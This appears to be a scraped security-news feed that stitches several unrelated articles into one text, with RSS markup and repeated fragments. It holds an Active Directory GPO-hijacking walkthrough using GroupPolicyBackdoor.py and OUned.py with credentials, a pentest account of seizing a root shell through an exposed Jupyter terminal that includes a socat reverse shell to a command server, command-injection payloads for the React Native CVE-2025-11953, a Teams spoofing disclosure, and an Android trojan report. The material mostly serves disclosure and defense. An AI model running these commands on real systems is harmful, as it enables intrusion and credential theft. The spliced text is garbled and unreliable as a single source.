$ smbclient '\\ad01-dc.corp.com\C$' -U 'corp.com\adove' --password 'Password1'Try "help" to get a list of possible commands. smb: \> dir $Recycle.Bin DHS 0 Thu Dec 21 09:28:19 2023 $WinREAgent DH 0 Thu Jun 12 18:37:16 2025 Documents and Settings DHSrn 0 Thu Dec 21 18:06:11 2023 DumpStack.log.tmp AHS 12288 Thu Oct 30 22:25:32 2025 pagefile.sys AHS 738197504 Thu Oct 30 22:25:32 2025 PerfLogs D 0 Sat May 8 01:20:24 2021 Program Files DR 0 Thu Dec 21 18:57:48 2023 Program Files (x86) D 0 Thu Dec 21 09:29:25 2023 ProgramData DHn 0 Tue Aug 26 00:10:17 2025 [...]
```

GroupPolicyBackdoor.py can then be used to remove the injected configuration with the `gpo clean` command, in order to remove exploitation traces.

```
$ python3 gpb.py gpo clean -d corp.com --dc ad01-dc.corp.com -u 'adove' -p 'Password1' -sf state_folders/2025_10_30_150424GPB - CLEAN command - 2025-10-30 15:11:19.450167 [#] Command execution setup [*] State folder is state_folders/2025_10_30_151119 [#] Cleaning configuration of type Scheduled Tasks (computer) [*] Cleaning configuration with identifier {22E4F6F1-6E6C-4449-8CD0-8D8CD76211A5} [*] Found the XML node to remove [*] Deleting empty file \\ad01-dc.corp.com\SYSVOL\corp.com\Policies\{CFD9229F-488C-445D-9829-8B8A443E0575}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml [*] Extension names should be updated [+] Successfully cleaned configuration Scheduled Tasks (computer) [+] Successfully updated extension names ('gPCMachineExtensionNames')[+] GPB CLEAN command success
```

_b. Exploiting GenericAll, GenericWrite or WriteGPLink rights over a site_

The second exploitation scenario happens when a user has either **GenericAll**, **GenericWrite** or **WriteGPLink** permissions over a site. This may happen because of nested group memberships or configurations mishaps that are commonly observed in Active Directory environments. But this can also result from a deliberate administrative choice. Indeed, Active Directory explicitly allows administrators to delegate the ability to manage Group Policy links for a site.

The **GenericAll**, **GenericWrite** and **WriteGPLink** ACLs all allow to do one interesting thing from an attacker standpoint: alter the **gPLink** attribute of the site.

The **gPLink** attribute is an LDAP attribute that indicates which GPO is linked to the container (domain, Organizational Unit or, in our case, site). With the ability to modify the **gPLink**’s value, an attacker may trick the objects linked to the target container into applying a malicious GPO. This can be achieved in two ways.

The first way is the most straightforward. If an attacker controls any GPO in the domain, they would be able to inject a malicious configuration into it, and then link it to the target site, taking advantage of their **G** **enericAll**, **G** **enericWrite** or **WriteGPLink** permissions. Again, this can be performed using the GroupPolicyBackdoor.py tool. The commands needed to inject a malicious configuration into a GPO are the same as the one described above. Linking the altered GPO can then be executed with the `links link` command.

```
$ python3 gpb.py links link -d corp.com --dc ad01-dc.corp.com -o 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com' -n 'CONTROLLED' -u 'aacre' -p 'Password1'GPB - LINK command - 2025-10-30 15:21:00.734878 [#] Command execution setup [*] State folder is state_folders/2025_10_30_152100 [#] Creating link for 1 containers [*] Creating link for 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com' [+] Successfully created link on 'CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com'[+] GPB LINK command success
```

In case the attacker does not have control over a GPO, the **GenericAll**, **GenericWrite** or **WriteGPLink** ACLs can still be abused with limited prerequisites. The technique involved was first described by **Petros Koutroumpis** in his great research “OU having a laugh”. We later built upon it to demonstrate how this technique could be used to compromise protected objects in Organizational Units or exploit limited OU rights in the following article. We also released a tool automating the attack, OUned.py.

The principle behind the attack is explained in details in Petros Koutroumpis’ article, as well as in ours. We will not go over it in details again. The core principle of the attack is to add a GPO link to the **gPLink** attribute of the target container (here, the site). This GPO link points to a DNS name resolving to a machine under the attacker’s control, e.g. `s1n.corp.com`:

```
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=s1n,DC=corp,DC=com;0]
```

Objects associated with the site would then try to fetch the GPO on the attacker’s machine, which would simulate a valid Group Policy Container (LDAP), as well as a valid Group Policy Template (SMB) to serve the malicious GPO the clients are trying to apply, thus compromising said clients.

Here is a quick demonstration using OUned.py. Let’s assume that the **aacre** user has **WriteGPLink** permissions over the **NewYork** site, which has the **AD01-DC2** site server as domain controller of **corp.com**:

OUned.py takes a configuration file, such as the following:

```
[GENERAL] # The target domain name domain=corp.com # The target DC. If not specified, defaults to the domain name dc=ad01-dc2.corp.com # The Distinguished Name of the target container - here, the site containerDN=CN=NewYork,CN=Sites,CN=Configuration,DC=corp,DC=com # The username and password of the user having write permissions on the gPLink attribute of the target site username=aacre password=Password1 # The IP address of the attacker machine on the internal network attacker_ip=192.168.123.17 # The command that should be executed by child objects.

This is a code execution feature working as designed. When Jupyter is properly configured with token authentication (the default), this technique wouldn't work. The issue comes about when administrators disable security features and run Jupyter with elevated privileges—a dangerous combination on a shared machine.During a recent penetration test, I found myself staring at a restricted shell on a Linux box. No GUI, no browser, just a terminal, limited tunneling options, and whatever command-line tools I could find. The usual post-exploitation playbook quickly showed something interesting in the process list: a Jupyter notebook server running as root.For those unfamiliar, Jupyter is the Swiss Army knife of data science—a web-based environment where researchers and analysts write code, visualize data, and document their findings all in one place. It’s code execution as a service, basically.My first instinct was to check if the Jupyter server was accessible$ curl -s localhost:8888/api/status | jq .  "started": "2025-12-01T10:23:45.123456Z",  "last_activity": "2025-12-01T14:32:10.654321Z",  "connections": 2,}It was. The API was responding, and even better—no authentication token required. This meant the server was either running with  or I was accessing it from a trusted network. Either way, Christmas came early.Here's where things got a little more interesting. Jupyter's REST API documentation showed an interesting endpoint: . Unlike the kernel API (which executes Python code), the terminal API provides actual shell access. And I could create a terminal session fairly easily.# Create a terminal session$ curl -X POST localhost:8888/api/terminals{"name": "1", "last_activity": "2024-12-01T14:45:32.123456Z"}But there’s a catch. Terminals in Jupyter communicate over WebSocket, not HTTP. Traditional tools like  or  wouldn't work. I needed something that could speak WebSocket from the command line.After some research, I discovered —essentially netcat for WebSockets. It's a binary that bridges the gap between command-line tools and WebSocket services. Perfect for situations like this.With websocat in hand, I could now interact with Jupyter's terminal WebSocket, but it wasn’t immediately obvious how to send commands from there terminal. The Jupyter Client WebSocket documentation on WebSocket protocols provides some details about how messages are passed between kernels and the Jupyter web application. And the Terminado client’s websocket implementation outlines the format needed to interact with Jupyter.So when you connect to a Jupyter terminal via WebSocket, you're not getting a raw shell - you're talking to a protocol handler that expects JSON arrays where thefirst element is message type (, , , etc.)second element is the payload (for stdin, it's the command text)This lets Jupyter multiplex different data streams (input, output, control messages) over a single WebSocket connection. So sending  is how you talk to Jupyter's terminal WebSocket protocol.And when you connect, it seems to take a second to initialize the WebSocket connection, and it wouldn’t immediately take my commands, so the elegant solution is to sleep. And so, echoing a command like this:‍$ (sleep 1; echo '["stdin", "id\\n"]'; sleep 1; echo '["stdin", "exit\\n"]') | ./websocat "ws://localhost:8888/terminals/websocket/1"# returns this["setup", {}]["stdout", "\\u001b[?2004h/home/jupyter $ "]["stdout", "id\\r\\n"]["stdout", "uid=0(root) gid=0(root) groups=0(root)\\r\\n"]UID 0? Of course, the Jupyter server was running as root, and the terminal API was giving me a root shell. No sudo required, no privilege escalation needed—just ask nicely and receive.With root access through the terminal, I could now read Jupyter's runtime files:$ (sleep 1; echo '["stdin", "cat /root/.local/share/jupyter/runtime/kernel-*.json\\n"]'; \\   sleep 1; echo '["stdin", "exit\\n"]') | \\  /tmp/websocat "ws://localhost:8888/terminals/websocket/1"These kernel connection files contained:Connection ports for each running kernelHMAC signing keys for message authenticationWith these, I could connect directly to any running notebook kernel and execute code in other users' sessions. Session hijacking for data science.For easier interaction, I established a proper reverse shell:$ (sleep 1; echo '["stdin", "socat exec:\\"bash -li\\",pty,stderr,setsid,sigint,sane tcp:my.c2.server:4444 &\\n"]';    sleep 1; echo '["stdin", "exit\\n"]') | ./websocat "ws://localhost:8888/terminals/websocket/1"Now I had a fully interactive root shell, running through Jupyter's own process. To any monitoring system, this might look like legitimate Jupyter activity.This isn't a vulnerability in Jupyter—it's a deployment anti-pattern. - Jupyter was running with root privileges, probably because someone needed GPU access or wanted to avoid permission issues The server was started with authentication disabled, for convenience The terminal feature was enabled (default in many installations)Together, these created a perfect storm.

The vulnerability is in a package which is part of the broader React Native Community CLI project that was extracted from the core react-native codebase a few years ago to improve maintainability. The CLI is a collection of command line tools that help developers build React Native mobile applications. It is officially used for creating React Native mobile apps without using a framework, as well as React Native for Windows, React Native for macOS, and more.Unlike typical vulnerabilities in development servers that are only exploitable from a developer’s local machine, a second security issue that the team spotted in React Native’s core codebase, exposes the development serverto external network attacks – making the former vulnerability a highly critical issue.Who is affected by CVE-2025-11953?Developers who initiated their React Native project with a vulnerable version of @react-native-community/cli, and run the Metro development server via one of the following or similar commands are vulnerable to CVE-2025-11953: npm start
 npm run [start|android|ios|windows|macos]
 npx react-native [start|run-android|run-ios|run-windows|run-macos]
 npx @react-native-community/cli [start|run-android|run-ios|run-windows|run-macos]
While the vulnerability is exploitable by default when initiating a react-native project using @react-native-community/cli, it is important to understand that not every developer that has this library installed as a dependency is necessarily vulnerable.Specifically, developers who use React Native with a framework that doesn’t use Metro as the development server are typically not vulnerable.The vulnerability directly affects the @react-native-community/cli-server-api package, versions 4.8.0 to 20.0.0-alpha.2, and is fixed since version 20.0.0.Here is how to check whether the vulnerable package exists in a specific NodeJS project: cd <Project Folder>
 npm list @react-native-community/cli-server-api
The package may also be globally installed on your system, which can be checked by running: npm list -g @react-native-community/cli-server-api
Note that the affected package is commonly bundled with @react-native-community/cli in matching versions. As a result, projects using @react-native-community/cli versions 4.8.0 through 20.0.0‑alpha.2 are likely to include vulnerable versions of @react-native-community/cli-server-api.On Windows, we have proven that this vulnerability leads to arbitrary OS command execution (shell commands with full parameter control). On macOS and Linux, the vulnerability leads to execution of arbitrary executables with limited parameter control. Arbitrary OS command execution on these platforms may be achievable with further research.How can CVE-2025-11953 be mitigated?Performing the following steps will mitigate CVE-2025-11953:Update @react-native-community/cli-server-api to version 20.0.0 or higher, which includes a fix for this vulnerability, in each of your react-native projects. This is the recommended solution.For improved security, or if upgrading is not possible, bind the development server to the localhost interface explicitly, by including the “–host 127.0.0.1” flag, per the examples below: npx react-native start --host 127.0.0.1
 npx @react-native-community/cli start --host 127.0.0.1
The Metro development server, which is opened by @react-native-community/cli, binds to external interfaces by default (a small security issue in itself). The server’s  endpoint handles a POST request that includes a user-input value that is passed to the unsafe  function provided by the open NPM package, which will cause OS command execution.This allows an unauthenticated network attacker to send a POST request to the server and execute arbitrary shell commands with attacker-controlled parameters.CVE-2025-11953 Technical DetailsWhen creating a React Native project, developers can choose to , such as Expo, which uses the framework’s CLI and is not vulnerable, or  – as we’ll choose here – if they prefer to write their own framework or have certain constraints that a certain framework interferes with.The development process typically begins by using the @react-native-community/cli to initialize a new project with the command npx @react-native-community/cli init MyApp, which sets up the necessary project structure, dependencies, and configuration files. During active development, developers rely on the CLI to run the Metro development server (using commands like ) which serves the JavaScript bundle to the running app (on an emulator or mobile device) and enables essential development features like hot reloading and fast refresh for rapid iteration.While running  – react-native’s cli.js forwards the command to @react-native-community/cli package (an optional dependency of react-native), which runs its build\index.js::setupAndRun() function. This function loads the CLI commands (i.e. ) by calling , which finds and uses the node-modules/react-native/react-native.config.js file in the process. const commands = [];
 const {
   bundleCommand,
   startCommand,
 } = require('@react-native/community-cli-plugin');
 commands.push(bundleCommand, startCommand);
node-modules/react-native/ – adds the  to an exported commands list that is then added to the CLI commands list.The react-native.config.js file imports  from @react-native/community-cli-plugin – that is responsible for running the development server. import runServer from './runServer';
 /* ... */
 const startCommand: Command = {
   name: 'start',
   func: runServer,
   description: 'Start the React Native development server.',

 import {createDevServerMiddleware} from './middleware'; /* *** 1 *** */

 /* ... */

 /* *** 2 *** */
 const { middleware:  } = createDevServerMiddleware({
     host: hostname,
     port,
     watchFolders,
   });

 /* ... */

   /* *** 3 *** */
   await (metroConfig, {
     host: args.host,
     secure: args.https,
     secureCert: args.cert,
     secureKey: args.key,
     unstable_extraMiddleware: [, middleware],
     websocketEndpoints: {
       ...communityWebsocketEndpoints,
       ...websocketEndpoints,
     },
   });
 does the following:Imports the createDevServerMiddleware function from , which imports it from @react-native-community/cli-server-api’s index.ts.Runs createDevServerMiddleware, which creates  – a function added to an HTTP server that intercepts incoming requests, adds functionality, and then passes them to the next handler. In our case, the  handler that interests us is , which is handled by the  handler. The middleware is set to the  variable.Runs the Metro server, with  as a parameter. This is the CLI’s development server.Now let’s look at the  handler that was added to the server as part of : async function openURLMiddleware(req: IncomingMessage, ...) {
   if (req.method === 'POST') {

     /* ... */

     const {url} = req.body as {url: string};

     await open(url);

     /* ... */

   }
   next();
 }
 export default connect().use(json()).use(openURLMiddleware);
This function is called with an HTTP request  parameter, that is a JSON POST request, with a  string field. It takes the value of the ’s field, which is an unsanitized string coming directly from the user, and uses it as a parameter to  call. does the following on Windows machines:
Sets  to run to be “cmd”Builds the  array: ['/c', 'start', '""', '/b']Escapes & with ^ in the  which is the url we supplied.Adds  string to the Runs the following command:childProcess.spawn(command, cliArguments, childProcessOptions);While the  cmd command can accept a single URL param and open it inside the default browser due to its HTTP URI scheme, it also accepts the following format for running commands:start “title” /b command optional_command_parametersIn the case of , the following new process will be spawned: cmd /c start “” /b calc.exe
Resulting in execution of calc.exe.For running any arbitrary command, we could set open’s  parameter to a  command. For example, resulting in spawning the following: cmd /c start "" /b cmd /c echo abc > c:\temp\pwned.txt
Attack surfaces on different operating systemsUnlike Windows, as shown above, the open package uses different code paths on macOS and Linux, executing  and  respectively. In Unix-like OSs, the spawned process expects each argument to be a separate string in , which is unlike Windows where the spawned process expects a single  argument string that is joined before the  invocation.Furthermore, both commands are executed without a shell. Combined with the fact that we only control a single string (url) – these factors will not allow straightforwardly running arbitrary commands on macOS and Linux.Both xdg-open and open determine whether the input string is a file or URI – and act (dispatch) accordingly.The attack surface for achieving code execution in these OSs may depend on the system’s configuration and typically comprises of:Finding a URI scheme whose handler can help achieve a step in the exploitation (either as a feature or exploit a vulnerability in the handler itself).Executing a local file by using a regular or file:// URI scheme. (optionally could be combined with a file-dropper primitive).Executing a remote file on the attacker’s server by using smb:// ,dav:// URI schemes or similar. (will likely trigger security dialogues asking for the victim user’s approval)In conclusion – arbitrary OS command execution on these platforms may be achievable with further research.Shouldn’t the dev server only bind to localhost?As we’ve shown earlier, while running the Metro development server, it explicitly states that it is starting using the localhost interface:However – in reality, we can see the server is listening on all interfaces! (0.0.0.0 and IPv6 [::]):As mentioned previously, this is due to another vulnerability that we’ve discovered and disclosed in @react-native/community-cli-plugin, which was regarded as “Informative”.By running , the code reaches the runServer.js::runServer function: async function runServer(
   _argv: Array,
   cliConfig: Config,
   args: StartCommandArgs,
 ) {

   /* ... */

   const hostname = args.host?.length ? args.host : 'localhost'; // *** 1 ***

   /* ... */

   const protocol = args.https === true ? 'https' : 'http';
   const devServerUrl = url.format({protocol, hostname, port}); // *** 2 ***

   /* ... */

   console.info(`Starting dev server on ${devServerUrl}\n`); // *** 3 ***

   /* ... */

   await Metro.runServer(metroConfig, {
     host: args.host, // *** 4 ***
Relevant parts of runServer function from runServer.js holds the  parameter, if supplied, or . is formed using hostname.The misleading message “Starting dev server on http://localhost:8081” is printed. function, responsible for running the Metro development server is called with the host being , which is , instead of using the  variable.Later on, Metro’s runServer’s code uses this undefined parameter when calling “If host is omitted, the server will accept connections on the unspecified IPv6 address (::) when IPv6 is available, or the unspecified IPv4 address (0.0.0.0) otherwise. In most operating systems, listening to the unspecified IPv6 address (::) may cause the net.Server to also listen on the unspecified IPv4 address (0.0.0.0).”Explicitly passing  is functionally equivalent to omitting the parameter. Thus, the server by default will listen for external connections.As a result – the development-only HTTP endpoints are exposed to .This vulnerability shows that even straightforward Remote Code Execution flaws, such as passing user input to the system shell, are still found in real-world software, especially in cases where the dangerous sink function actually resides in 3rd-party code, which was the imported “open” function in this case. It’s a reminder that secure coding practices and automated security scanning are essential for preventing these easily exploitable flaws before they make it to production.A good way to avoid these and similar vulnerabilities in your own code is by deploying JFrog Advanced Security’s SAST scanning which enables developers to identify and fix security issues early in the development process. With zero configuration required, JFrog SAST integrates seamlessly into existing workflows through IDE plugins and CLI tools, giving developers easy access to actionable findings without interrupting their flow.For example, in the screenshot below we can see how JFrog SAST discovers the above vulnerability, when scanned as 1st party code directly from within Visual Studio Code:JFrog SAST highlights the vulnerability in the code along with its details and provides Data Trace Evidence that shows the data flow from the user-input req.body field until it is used as an input to the dangerous open function.To stay on top of other attacks and zero-day vulnerabilities, make sure to check out the JFrog Security Research center for the latest on CVEs, vulnerabilities and fixes.]]></content:encoded></item><item><title>The Top 3 Browser Sandbox Threats That Slip Past Modern Security Tools</title><link>https://www.bleepingcomputer.com/news/security/the-top-3-browser-sandbox-threats-that-slip-past-modern-security-tools/</link><author>Sponsored by Keep Aware</author><category>security</category><pubDate>Tue, 4 Nov 2025 15:02:12 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Attackers exploit web browsers' built-in behaviors to steal credentials, abuse extensions, and move laterall, slipping past traditional defenses.

**Key Findings:**

Launched in March 2017, Microsoft Teams has become one of the most widely used communication and collaboration platforms in the world. As part of the Microsoft 365 family, Teams provides workplaces with chat, video conferencing, file storage, and application integration to more than 320 million monthly active users. From the largest global enterprises to small and medium-sized businesses, Teams has become a critical backbone of modern workplace communication.

Our research revealed a series of vulnerabilities in Teams that undermine those trusted communication channels. We found that both external guest users and malicious insiders can manipulate messages, impersonate executives, and even spoof notifications. In practice, this means an attacker could enter as a guest and convincingly appear to be the CEO, a fundamental breakdown of the trust that organizations rely on to operate securely.

In recent years, we’ve witnessed sophisticated threat actors, including state-sponsored groups and nation-state actors, increasingly target collaboration platforms and communication tools as part of broader espionage and data exfiltration campaigns. These advanced persistent threat (APT) groups have demonstrated particular interest in:

Today, threat actors exploit the inherent trust users place in familiar communication and workspace interfaces, using social engineering tactics to manipulate employees through platforms organizations depend on for daily operations.

Recent intelligence reports have highlighted how these threat actors specifically target remote work infrastructure, recognizing that communication platforms have become critical business infrastructure. Given this evolving threat landscape, Check Point Research set out to investigate potential security gaps in widely-used workspace tools. As part of this broader research initiative into these platforms, we examined Microsoft Teams to identify how its trust mechanisms could be subverted. The findings presented here highlight Teams as one example of a wider issue: the ways attackers can exploit trust in modern workspace tools.

We approached this research from two key attack perspectives: external guest users attempting to infiltrate organizations, and internal malicious users, such as compromised employees or insider threats, seeking to abuse their existing access.

Our research revealed several vulnerabilities within Microsoft Teams that could be exploited to manipulate message content and sender identity, alter notification appearances. Most critically, we discovered that both external guest users and internal malicious actors can effectively transform their identity to appear as trusted personnel, including C-level executives, fundamentally breaking the trust boundaries that organizations rely on for secure communication.

These findings are significant, demonstrating not just theoretical risks but practical loopholes that could be used for misinformation, impersonation, and privacy breaches. Whether starting as an external guest user or operating as a malicious insider, an attacker could seamlessly transition to appearing as a trusted authority figure, potentially fooling employees into believing they’re communicating with their CEO, finance director, or other high-authority figures.

Specifically, we were able to:

Together, these vulnerabilities show how attackers can erode the fundamental trust that makes collaboration workspace tools effective, turning Teams from a business enabler into a vector for deception.

Microsoft had previously disclosed CVE-2024-38197 as a medium-severity spoofing issue in Microsoft Teams for iOS, noting that earlier client versions did not properly validate message sender fields and could therefore misrepresent user identity in limited cases. Our research expands on those findings by demonstrating a more impactful exploitation path: we developed a proof-of-concept showing how a malicious bot or webhook could craft payloads with falsified “from” attributes that rendered convincingly as trusted users within the Teams interface. This amplification highlights not only the practical risk of targeted impersonation but also the broader need for stricter validation controls across Teams clients.

While Microsoft Teams offers both web and application versions that function similarly, we focused our research on the web version. This version, like its app counterpart, accepts and processes JSON payloads for various actions, such as sending messages and making calls.

When a message is dispatched, several parameters are included in the request body:

Upon sending a POST request, the response includes the **OriginalArrivalTime** parameter, which carries a Unix timestamp value, which is crucial for operations that modify the message post-send, such as editing, deleting, or quoting our own or someone else’s messages.

Moreover, another key piece of information obtained is the unique UUID assigned to every user. It can be found by fetch conversation of specific user or his messages whether from private or group chat:

This UUID (from above screenshot it starts with 8:orgid:37f85325) is essential for identifying users within the system and plays a significant role in the vulnerabilities we will explore.

Let’s begin with the basics and explore what modifications we can make to our own messages. As previously mentioned, when we send a message, we include a **clientmessageid** parameter (along with the content of our message) and receive a Unix timestamp value for the **OriginalArrivalTime** parameter:

**OriginalArrivalTime**: 1709414616944

**clientmessageid**: 2711247313308716623

Upon retrieving our entire chat history, we can observe these values:

Now, let’s attempt to edit our message directly within MS Teams. Unfortunately, this action results in an “Edited” label appearing above our message. To bypass this, we can craft a new message and replace the **clientmessageid** with the value from our previous message – **2711247313308716623**. This approach effectively masks our edit, making it undetectable to others.

**Manipulating Notifications**

Whether on a phone app or a PC, these alerts draw our immediate attention, especially when they signal messages from key figures within an organization. For instance, receiving a notification that implies a message is from the CEO or another high-ranking official inherently demands a higher level of urgency and importance. This psychological effect is what makes notifications not just informative but influential.

Within each message sent, there’s a parameter called **imdisplayname**, which, by default, displays the sender’s name:

Through our investigation, we’ve found that this parameter can be altered to any desired value. This manipulation results in the recipient receiving a notification that appears to come from someone other than the actual sender:

Result:

**Altering Display Names in Private Chats**

Microsoft Teams provides functionality to update the conversation topic in group chats through a specific PUT endpoint. This feature is designed to help users organize and identify their chats more efficiently.

Whether starting as an external guest user or operating as a malicious insider, an attacker could seamlessly transition to appearing as a trusted authority figure, potentially fooling employees into believing they’re communicating with their CEO, finance director, or other high-authority figures.Specifically, we were able to:Edit Messages Without Trace: We discovered a method to alter the content of sent messages without leaving the usual “Edited” label.Manipulate Messages Notifications: Our research uncovered a technique to change the apparent sender of a message, enabling the display of notifications, for example, from high-profile individuals like CEOs, thus exploiting the trust and urgency typically associated with such communications.Altering Display Names via Conversation Topics in Private Chats: We identified a vulnerability that allows an attacker to change the displayed name in private chat conversations by modifying the conversation topic. Both participants see the altered topic as the conversation name, potentially misleading them about the conversation’s context.Forge Caller Identity in Video/Audio CallsWe discovered that the display name used in call notifications (and later on during call itself) could be arbitrarily modified through specific manipulations of call initiation requests. This flaw allows an attacker to forge the caller identity, presenting any chosen name to the call recipient.Together, these vulnerabilities show how attackers can erode the fundamental trust that makes collaboration workspace tools effective, turning Teams from a business enabler into a vector for deception.Microsoft had previously disclosed CVE-2024-38197 as a medium-severity spoofing issue in Microsoft Teams for iOS, noting that earlier client versions did not properly validate message sender fields and could therefore misrepresent user identity in limited cases.

This version, like its app counterpart, accepts and processes JSON payloads for various actions, such as sending messages and making calls.Understanding Teams Messaging ArchitectureWhen a message is dispatched, several parameters are included in the request body:: The actual text of the message surrounded by HTML tags: For standard text messages, this is typically set to RichText/Html. However, this parameter changes to reflect the specific action being performed for other actions like adding a new user or initiating a new conversation.: A unique identifier for each user’s message, ensuring that each message can be individually tracked and managed.: The display name of the user who sent the message, allowing recipients to see who the message is from.Upon sending a POST request, the response includes the  parameter, which carries a Unix timestamp value, which is crucial for operations that modify the message post-send, such as editing, deleting, or quoting our own or someone else’s messages.Moreover, another key piece of information obtained is the unique UUID assigned to every user.

This feature is designed to help users organize and identify their chats more efficiently.PUT /api/chatsvc/emea/v1/threads/<Conversation ID>/properties?name=topicBy manipulating the request to this endpoint, it’s possible to alter the conversation topic not just in group chats, where such changes are expected and allowed, but surprisingly, in private conversations as well.In case of private chat—a direct conversation between two individuals—any change to the topic should ideally be restricted or not applicable, given the nature of private chats not having a ‘topic’ in the conventional sense.Such a change, when executed, can mislead users into believing they are engaging in a conversation with a different person.Forging Caller Identity in Video/Audio CallsWe discovered that the display name used in call notifications could be arbitrarily modified through specific manipulations of call initiation requests. This flaw allows an attacker to forge the caller identity, presenting any chosen name to the call recipient.During the call initiation phase, a JSON payload is sent to:containing various parameters that define the call’s characteristics. Among these, the “displayName” parameter within the “participants” section is of particular interest. This parameter is intended to display the name of the caller as it appears to the recipient.By modifying the “displayName” value in the payload, we were able to alter the apparent identity of the caller. For instance, changing it to an arbitrary name results in the call recipient seeing a call incoming from the modified name, instead of the actual caller’s identity:Real-World Attack ScenariosThese vulnerabilities create several concerning attack scenarios that align with techniques used by sophisticated threat actors, including nation-state groups:Executive Impersonation and Social EngineeringAttackers can significantly impersonate others, making it appear as though a message was sent by someone else. In private chats, a malicious guest user could impersonate someone internal, such as a finance department member. Notifications can be spoofed to display a false sender name, preying on the instinct to trust official-looking notifications, potentially from authority figures or top executives.Advanced Persistent Threats and Data ExfiltrationThese attacks can directly facilitate more severe malicious activities commonly seen in nation-state campaigns:: Attackers can send a spoofed notification, seemingly from a trusted source like a top executive, asking for urgent action or clicking a link, which then installs malware.Credential Harvesting / Fraud: By impersonating someone internal, particularly in finance, attackers could fish for sensitive data or commit fraud by pretending to discuss budget numbers or other sensitive information.: The ability to create false message histories and undermine trust in conversation integrity enables the spread of misinformation campaigns.: The overall vulnerability impact includes privacy breaches.: The ability to impersonate individuals during sensitive briefings hosted on Teams can spread confusion or trick participants into revealing sensitive information. This implies a broad risk for any role involved in high-stakes communications.Risk Mitigation StrategiesHow Organizations Can Reduce Their RiskMicrosoft has since addressed the vulnerabilities we reported in Teams, requiring no action from users. However, collaboration platforms provide only a baseline of native security, and our research shows that this layer can be bypassed.To protect against trust exploitation, organizations need an additional layer of defense that includes:Zero Trust Access Controls – verifying user identity and device posture continuously, not just at login.Advanced Threat Prevention – inspecting files, links, and payloads shared inside collaboration apps.Data Loss Prevention (DLP) – enforcing granular policies to prevent unauthorized data exfiltration.User Awareness and Verification Protocols – training employees to question high-risk requests and use out-of-band validation for sensitive actions.Protecting the modern workplace requires security that extends beyond what collaboration platforms natively deliver. Only with a second, multi-layered defense can organizations safeguard the communications, data, and trust that keep business running.Join our webinar to dive deeper into the findings and practical defenses:

How Organizations Can Reduce Their RiskMicrosoft has since addressed the vulnerabilities we reported in Teams.However, the vulnerabilities we discovered emphasize the importance of behavioral practices for reducing exposure:: Our research highlights the constant need for critical thinking now more than ever. Users should always question what they see and hear online, even when it seems to come from a source they normally trust.: Understanding these specific attack vectors is a vital to becoming more digitally aware. Organizations should educate their teams about these particular manipulation techniques.: Given the ease with which these vulnerabilities can be exploited, organizations should implement out-of-band verification methods for sensitive communications, especially those involving financial transactions or sensitive data.23 March 2024 – Vulnerabilities were disclosed to Microsoft.25 March 2024 – Microsoft acknowledged the disclosure and confirmed it would investigate the reported issues.18 April 2024 – Microsoft confirmed the reported behavior and stated that they would continue their investigation to determine the appropriate resolution.8 May 2024 – The “Edit Messages Without Trace” issue was fixed.31 July 2024 – The “Altering Display Names in Private Chats” was fixed.13 August 2024 – Planned release date for the fix addressing the “Manipulating Notifications” issue, tracked as CVE-2024-38197.13 September 2024 – The “Manipulating Notifications” issue was fixed.October 2025 – The “Caller Identity in Vide/Audio Calls” issue was fixed]]></content:encoded></item><item><title>Windows 10 update bug triggers incorrect end-of-support alerts</title><link>https://www.bleepingcomputer.com/news/microsoft/windows-10-update-bug-triggers-incorrect-end-of-support-alerts/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 4 Nov 2025 13:31:05 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[​Microsoft says the October 2025 updates trigger incorrect end-of-support warnings on Windows 10 systems with active security coverage or still under active support.

The malware spreads by pretending to be trusted apps—like a news reader or even digital ID apps—tricking users into downloading it by accident.In reality, it’s Android-targeting malware that preys on people who use banking and cryptocurrency apps. And a sneaky one. Once installed, it doesn’t announce itself in any way, but quietly works in the background to steal information such as login details and money.​First, it checks if it’s running on a real phone or in a security test system so it can avoid detection. Then, it asks users for special permissions called “Accessibility Services,” claiming these help improve the app but actually giving the malware control over the device without the owner noticing. It also adds itself as a Device Administrator app.With these permissions, the Trojan can read what’s on the screen, tap buttons, and fill in forms as if it were the user. It also overlays fake login screens on top of real banking and cryptocurrency apps, so when someone enters their username and password, the malware steals them. Simply put, the Android overlay feature allows an app to appear on top of another app. Legitimate apps use overlays to show messages or alerts—like Android chat bubbles in Messenger—without leaving the current screen.The Trojan connects to a remote command center, sending information about the phone, its location, and which banking apps are installed. At this point, attackers can send new instructions to the malware, like downloading updates to hide better or deleting traces of its activity. As soon as it runs, the Trojan also silences notifications and sounds so users don’t notice anything out of the ordinary.The main risk is financial loss: once cybercriminals have banking credentials or cryptocurrency wallet codes, they can steal money or assets without warning. At this point in time the malware targets banking users in Southeast Asia, but its techniques could spread anywhere.As we rely more on our phones for payments and important tasks, it’s clear that our mobile devices need the same level of protection that we expect on our laptops.Stick to trusted sources. Download apps—especially VPNs and streaming services—only from Google Play, Apple’s App Store, or the official provider. Never install something just because a link in a forum or message promises a shortcut.Check an app’s permissions. If an app asks for control over your device, your settings, Accessibility Services, or wants to install other apps, stop and ask yourself why. Does it really need those permissions to do what you expect it to do?Use layered, up-to-date protection. Install real-time anti-malware protection on your Android that scans for new downloads and suspicious activity. Keep both your security software and your device system updated—patches fix vulnerabilities that attackers can exploit.Follow trustworthy cybersecurity news and share important warnings with friends and family.File name: IdentitasKependudukanDigital.apkSHA-256: cb25b1664a856f0c3e71a318f3e35eef8b331e047acaf8c53320439c3c23ef7cFile Name: identitaskependudukandigital.apkSHA256:19456fbe07ae3d5dc4a493bac27921b02fc75eaa02009a27ab1c6f52d0627423File Name: identitaskependudukandigital.apkSHA-256: a4126a8863d4ff43f4178119336fa25c0c092d56c46c633dc73e7fc00b4d0a07We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Linux kernel Bluetooth RCE</title><link>https://source.android.com/docs/security/bulletin/2025-11-01</link><author>/u/elatllat</author><category>netsec</category><pubDate>Tue, 4 Nov 2025 12:40:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - 